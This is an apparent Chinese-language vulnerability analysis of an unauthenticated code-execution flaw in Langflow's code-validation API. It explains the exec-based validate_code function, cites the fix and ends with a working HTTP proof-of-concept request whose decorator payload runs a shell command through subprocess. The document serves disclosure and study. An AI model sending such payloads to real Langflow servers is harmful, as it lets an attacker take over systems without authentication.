#AIcybercurity #Langflow #rce 
- https://github.com/langflow-ai/langflow/issues/7574
- 代码增改： https://github.com/langflow-ai/langflow/pull/6911/files
## 项目地址
- https://www.langflow.org/
- https://github.com/langflow-ai/langflow/

## 漏洞分析

### 漏洞简介
- 受影响版本的Langflow的`src/backend/base/langflow/api/v1/validate.py` 的`post_validate_code`方法**未对用户身份做校验**直接使用 `langflow.utils.validate` 的 `validate_code` 方法运行传入的代码，导致代码注入漏洞；
- 漏洞修复： 增加`CurrentActiveUser`验证 https://github.com/langflow-ai/langflow/pull/6911/files ![](media/Pasted%20image%2020250411221421.png) 

```python
post_validate_code(code)
		- > validate_code(code) # 	- > 函数在langflow.utils.validate被定义
			-> trae = ast.parse(code )
				->  exec( compile(trae) )
```



### `langflow.utlis.validate`解释
- 流程图
```python
          原始代码
             │
             ▼
    解析为 AST（语法检查） → 失败则记录错误到 function.errors
             │
             ▼
    遍历 AST 中的节点
             │
             ├── 处理 Import 节点 → 尝试导入模块 → 失败则记录到 imports.errors
             │
             └── 处理 FunctionDef 节点
                     │
                     ├── 编译为独立模块
                     │
                     └── 执行 exec(code_obj) → 失败则记录到 function.errors
```
- 关键函数
```python

# AST 解析与语法检查
....
tree = ast.parse(code)
....


# 函数定义的动态执行

code_obj = compile(ast.Module(body=[node], type_ignores=[]), "<string>", "exec")
.....
	exec(code_obj) 
......

```
- 原始文件
```python
def validate_code(code):
    # Initialize the errors dictionary
    # 错误字典结构：包含imports和function两个部分的错误收集
    errors = {"imports": {"errors": []}, "function": {"errors": []}}

    # Parse the code string into an abstract syntax tree (AST)
    # 尝试将代码解析为AST，捕获语法错误等解析异常
    try:
        tree = ast.parse(code)
    except Exception as e:  # noqa: BLE001
        # 注意：此处将代码解析错误（如语法错误）归类到function错误中，可能分类不合理
        if hasattr(logger, "opt"):
            logger.opt(exception=True).debug("Error parsing code")
        else:
            logger.debug("Error parsing code")
        errors["function"]["errors"].append(str(e))  # 解析错误应属于全局而非函数部分
        return errors

    # Add a dummy type_ignores field to the AST
    # 兼容性处理：某些Python版本可能需要type_ignores属性
    add_type_ignores()  # 假设该函数为AST节点添加type_ignores属性
    tree.type_ignores = []  # 显式设置为空列表

    # Evaluate the import statements
    # 检查所有import语句是否能正确导入
    for node in tree.body:
        if isinstance(node, ast.Import):
            for alias in node.names:
                try:
                    importlib.import_module(alias.name)
                except ModuleNotFoundError as e:
                    errors["imports"]["errors"].append(str(e))
        # 潜在问题：未处理ast.ImportFrom（from ... import）的情况，会导致漏检

    # Evaluate the function definition
    # 检查函数定义是否存在运行时错误
    for node in tree.body:
        if isinstance(node, ast.FunctionDef):
            # 将函数节点单独编译为模块（可能缺少上下文依赖）
            code_obj = compile(ast.Module(body=[node], type_ignores=[]), "<string>", "exec")
            try:
                exec(code_obj)  # 在独立环境中执行，可能因缺少依赖（如导入、变量）而报错
            except Exception as e:  # noqa: BLE001
                logger.opt(exception=True).debug("Error executing function code")
                errors["function"]["errors"].append(str(e))  # 捕获函数定义时的运行时错误

    # Return the errors dictionary
    return errors
```


### CodeQl分析

1. `git clone github.com/langflow-ai/langflow`
2. 切换到`git checkout v1.1.0` 有漏洞的版本下

## Poc
```http
POST /api/v1/validate/code HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"echo\",\"yyds\"]))')\ndef foo():\n  pass"}
```
